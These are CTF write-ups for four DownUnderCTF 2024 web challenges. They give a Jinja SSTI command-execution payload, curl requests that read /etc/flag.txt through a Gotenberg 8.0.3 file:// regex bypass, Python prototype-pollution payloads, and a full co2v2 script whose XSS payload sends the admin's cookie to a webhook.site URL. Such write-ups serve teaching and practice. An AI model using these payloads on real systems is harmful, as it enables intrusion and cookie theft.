# DUCTF writeups

<h1>WEB</h1>

# Parrot EMU

Basic file read SSTI

`{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}`

# hah-got-em

This is based on a vulnerability in an old version of the tool called gotenberg. [Gotenberg](https://github.com/gotenberg/gotenberg) is a docker based tool
which allows conversion of multiple formats like html,url,markdown into pdfs. The challenge used a particular version of gotenberg - 8.0.3 and
 we can see in the commits that the next verion 8.1.0 is a patch. So comparing the two versions we see 
 1) A regex has been improved 
 
 ![Regex]()
 
 2) A [test case](https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0#diff-be84e06649ad8faf29f22ad46330a6e9b83dbaf2d6c35b2a3656313d26a79d35) added 
 to check for a particular file read vulnerability.
 
 ![Test_case]()
 
 Now going through the source provided we can see that the flag.txt in mounted in /etc/flag.txt.
 So exploiting either of these vulnerabilities we can get the flag.
 
 We can send the payload by either route as url or html or markdown. The html file is:
 
 ```
 <html>

<body>
    <iframe src="/proc/self/root/etc/flag.txt"></iframe>
    <iframe src="\\localhost/etc/flag.txt"></iframe>
</body>

</html>
 ```

 and then : `curl -X POST -F 'files=@index.html' -o sol.pdf http://{host_url}/forms/chromium/convert/html`
 
 Another method is this:
 `curl --request POST https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/url --form url=file://localhost/etc/flag.txt -o flag.pdf`
 
This bypasses the regex as we are using file:// instead of file:///.

<b>
This is due to the fact that a valid file URI can be defined as:

1)file:/path (no hostname)

2)file:///path (empty hostname)

3)file://hostname/path
</b>

# co2

This was basically a python prototype pollution attack where we just had to change the value of a global attribute from false to true to get access to the flag.
It was using a vulnerbale merge method to merge attributes provided by the user into a object.
The payload was:
```
data = {
        "__class__": {
            "__init__": {
                "__globals__": {
                    "flag": "true"
                }
            }
        }
    }
``` 


as this was python and it is to be sent to the save_feedback endpoint which used the vulnerable 
recursive merge function and thud allowed prototype pollution of global objects.

# co2v2

https://chuajianshen.github.io/2024/07/06/DownUnderCTF2024/#Description-co2v2

[](#Web-co2v2 "[Web] co2v2")\[Web\] co2v2
=========================================

[](#Description-co2v2 "Description (co2v2)")Description (co2v2)
---------------------------------------------------------------

> Well the last time they made a big mistake with the flag endpoint, now we don’t even have it anymore. It’s time for a second pentest for some new functionality they have been working on.

[](#Analysis-3 "Analysis")Analysis
----------------------------------

The challenge has the same merge function from the previous challenge but now the goal of the challenge is to achieve XSS. By looking at the source files, we can see that there are two protections in place which are:

*   Jinja Escaping
*   Content Security Policy (CSP) with random nonce

```
TEMPLATES\_ESCAPE\_ALL = True  
  
...  
  
class jEnv():  
    """Contains the default config for the Jinja environment. As we move towards adding more functionality this will serve as the object that will  
    ensure the right environment is being loaded. The env can be updated when we slowly add in admin functionality to the application.  
    """  
    def \_\_init\_\_(self):  
        self.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES\_ESCAPE\_ALL)  
  
template\_env = jEnv()  
  
...  
  
@app.after\_request  
def apply\_csp(response):  
    nonce = g.get('nonce')  
    csp\_policy = (  
        f"default-src 'self'; "  
        f"script-src 'self' 'nonce-{nonce}' https://ajax.googleapis.com; "  
        f"style-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "  
        f"script-src-attr 'self' 'nonce-{nonce}'; "   
        f"connect-src \*; "  
    )  
    response.headers\['Content-Security-Policy'\] = csp\_policy  
    return response  
  ```

Nonce generation code:

```
SECRET\_NONCE = generate\_random\_string()  
  
RANDOM\_COUNT = random.randint(32,64)  
  
...  
  
def generate\_nonce(data):  
    nonce = SECRET\_NONCE + data + generate\_random\_string(length=RANDOM\_COUNT)  
    sha256\_hash = hashlib.sha256()  
    sha256\_hash.update(nonce.encode('utf-8'))  
    hash\_hex = sha256\_hash.hexdigest()  
    g.nonce = hash\_hex  
    return hash\_hex  
  
...  
  
@app.before\_request  
def set\_nonce():  
    generate\_nonce(request.path)  
  
...  
```
The admin will visit the home page of the site which contains our blog posts, in order for our XSS payload to be executed, we would need to bypass these restrictions.

[](#Solution-3 "Solution")Solution
----------------------------------

There is a convenient route under /admin/update-accepted-templates that enables us to change the original autoescape value to false by prototype pollution. After escaping is bypassed, we will now have to bypass the CSP by changing the SECRET\_NONCE and RANDOM\_COUNT variables in order to generate a nonce that we control.

```
TEMPLATES\_ESCAPE\_ALL = True  
 
...

@app.route("/admin/update-accepted-templates", methods=\["POST"\])  
@login\_required  
def update\_template():  
    data = json.loads(request.data)  
  
    if "policy" in data and data\["policy"\] == "strict":  
        print("Policy reached", flush=True)  
        template\_env.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES\_ESCAPE\_ALL)  
  
    return jsonify({"success": "true"}), 200  
```
We will change the SECRET\_NONCE to an empty string “” and RANDOM\_COUNT to 0. The home page has a path of “/“ which will be passed to the data variable in generate\_nonce. The nonce will now become “” + “/“ + “” which is just “/“. The resulting nonce is “8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f1”.
```
def generate\_nonce(data):  
    nonce = SECRET\_NONCE + data + generate\_random\_string(length=RANDOM\_COUNT)  
    sha256\_hash = hashlib.sha256()  
    sha256\_hash.update(nonce.encode('utf-8'))  
    hash\_hex = sha256\_hash.hexdigest()  
    g.nonce = hash\_hex  
    return hash\_hex  
  ```

[](#Payload-2 "Payload")Payload
-------------------------------
```
import requests

URL = "https://web-co2v2-54990d5ba36d1ee8.2024.ductf.dev/"

s = requests.Session()

def register(username, password):
    data = {"username":username,"password":password}
    print(f"Registering {username} with password {password}")
    s.post(URL + "register", data=data)
    return 

def login(username, password):
    data = {"username":username,"password":password}
    s.post(URL + "login", data=data)
    print(f"Logging into {username}")
    return 

def pollute():

    templates_escape_all = {
        "__class__":{
            "__init__":{
                "__globals__":{
                    "TEMPLATES_ESCAPE_ALL": False
                }
            }
        }
    }

    escape_rule = {
        "policy": "strict"
    }

    secret_nonce = {
        "__class__":{
            "__init__":{
                "__globals__":{
                    "SECRET_NONCE": ""
                }
            }
        }
    }

    random_count = {
        "__class__":{
            "__init__":{
                "__globals__":{
                    "RANDOM_COUNT": 0
                }
            }
        }
    }

    print(f"Polluting TEMPLATES_ESCAPE_ALL")        
    s.post(URL + "save_feedback", json=templates_escape_all)

    print(f"Updating escape rule")
    s.post(URL + "admin/update-accepted-templates", json=escape_rule)

    print(f"Polluting SECRET_NONCE")        
    s.post(URL + "save_feedback", json=secret_nonce)

    print(f"Polluting RANDOM_COUNT")        
    s.post(URL + "save_feedback", json=random_count)

def XSS():
    payload = {
        "title":"""<script nonce="8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f1">window.location='https://webhook.site/39cf3b9c-65eb-4098-a261-e98dc1d8e01b?f='+document.cookie</script>""",
        "content":"",
        "public":1,
        "save":"Save Post"
    }

    print(f"Creating XSS post")        
    s.post(URL + "create_post", data=payload)

    print("Sending XSS to bot")
    s.get(URL + "api/v1/report")

if __name__ == "__main__":
    username = "XSS"
    password = "XSS"
    register(username, password)
    login(username,password)
    pollute()
    XSS()
```
